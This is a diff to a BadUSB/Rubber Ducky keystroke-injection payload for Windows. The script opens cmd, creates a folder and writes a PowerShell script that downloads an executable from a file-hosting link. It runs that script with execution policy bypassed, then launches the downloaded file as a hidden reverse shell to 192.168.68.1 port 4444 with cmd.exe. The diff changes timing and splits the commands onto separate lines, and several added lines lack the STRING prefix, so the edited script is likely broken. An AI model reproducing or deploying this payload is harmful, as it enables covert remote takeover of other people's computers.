@@ -1,14 +1,27 @@
-DELAY 400 
+DELAY 4000
 GUI r
-DELAY 100
+DELAY 4000
 
 STRING cmd
 ENTER
-DELAY 100
+DELAY 4000
 
-STRING cd / & mkdir /win & cd /win & echo (wget 'https://1fichier.com/?vcwr373r3a4sstxgguzr' -OutFile.a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1
+STRING cd /
 ENTER
-DELAY 50
+DELAY 4000
+
+mkdir /win 
+ENTER
+DELAY 4000
+
+cd /win 
+ENTER
+DELAY 4000
+
+echo (wget 'https://1fichier.com/?vcwr373r3a4sstxgguzr' -OutFile.a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1
+ENTER
+DELAY 5000
 
 STRING START /MIN a.exe 192.168.68.1 4444 -e cmd.exe -d & exit
 ENTER
+
